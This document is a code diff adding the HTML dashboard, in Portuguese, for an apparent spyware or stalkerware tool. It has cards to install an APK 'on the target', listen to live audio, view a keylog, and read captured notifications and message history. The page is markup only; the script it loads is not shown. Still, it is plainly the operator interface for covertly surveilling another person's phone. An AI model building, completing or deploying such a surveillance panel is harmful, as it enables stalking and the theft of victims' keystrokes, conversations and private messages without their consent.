@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Monitor Pro - Painel de Controle</title>
+    <link rel="stylesheet" href="style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
+</head>
+<body>
+    <div class="app-container">
+        <header class="main-header">
+            <div class="logo">Monitor<span>PRO</span></div>
+            <div class="header-right">
+                <div id="status-time" class="time-pill">Sincronizando...</div>
+                <div id="status-pill" class="status-offline">Offline</div>
+            </div>
+        </header>
+
+        <main class="dashboard-scroll">
+            <div class="welcome-text">
+                <div class="user-info">
+                    <h1>Olá, <span id="user-display">---</span></h1>
+                    <button id="btn-logout" class="logout-link">Sair da conta</button>
+                </div>
+                <p id="expira-txt">Conectando ao servidor...</p>
+            </div>
+
+            <div class="grid-layout">
+                <div class="m-card" id="card-download" style="border: 1px solid var(--accent); background: rgba(88, 166, 255, 0.05);">
+                    <div class="m-card-icon">📲</div>
+                    <div class="m-card-info">
+                        <h3 style="color: var(--accent);">Instalar no Alvo</h3>
+                        <p>APK extraído do banco</p>
+                    </div>
+                    <div style="display: flex; gap: 8px;">
+                        <button class="m-btn-icon" id="btn-copy-link" title="Copiar Link">🔗</button>
+                        <button class="m-btn" id="btn-download" style="background: var(--accent);">BAIXAR</button>
+                    </div>
+                </div>
+
+                <div class="m-card" id="card-audio">
+                    <div class="m-card-icon">🎙️</div>
+                    <div class="m-card-info">
+                        <h3>Monitor de Áudio</h3>
+                        <p id="audio-detail">Serviço pronto</p>
+                    </div>
+                    <button class="m-btn" id="btn-audio">OUVIR</button>
+                </div>
+
+                <div class="m-card locked" id="card-keylog">
+                    <div class="m-card-icon">⌨️</div>
+                    <div class="m-card-info">
+                        <h3>Keylog</h3>
+                        <p id="keylog-detail">Aguardando dados...</p>
+                    </div>
+                    <span class="m-badge">MARIADB ATIVO</span>
+                </div>
+
+                <div class="m-card locked" id="card-notif" style="cursor: pointer;">
+                    <div class="m-card-icon">💬</div>
+                    <div class="m-card-info">
+                        <h3 id="notif-app">Notificações</h3>
+                        <p style="font-size: 0.85rem; margin: 4px 0;">
+                            <strong style="color: var(--accent);">De:</strong> 
+                            <span id="notif-sender" style="color: var(--text);">---</span>
+                        </p>
+                        <p id="notif-detail" style="color: var(--subtext); font-size: 0.85rem;">Sem dados recentes</p>
+                    </div>
+                    <span class="m-badge">HISTÓRICO</span>
+                </div>
+            </div>
+        </main>
+
+        <div id="modal-historico" class="modal">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h2>Registros de Mensagens</h2>
+                    <span class="close-modal" id="close-modal">&times;</span>
+                </div>
+                <div id="lista-mensagens" class="modal-body"></div>
+            </div>
+        </div>
+
+        <nav class="bottom-nav">
+            <div class="nav-tab active">🏠<span>Início</span></div>
+            <div class="nav-tab">⚙️<span>Ajustes</span></div>
+        </nav>
+    </div>
+    <script src="script.js"></script>
+</body>
+</html>
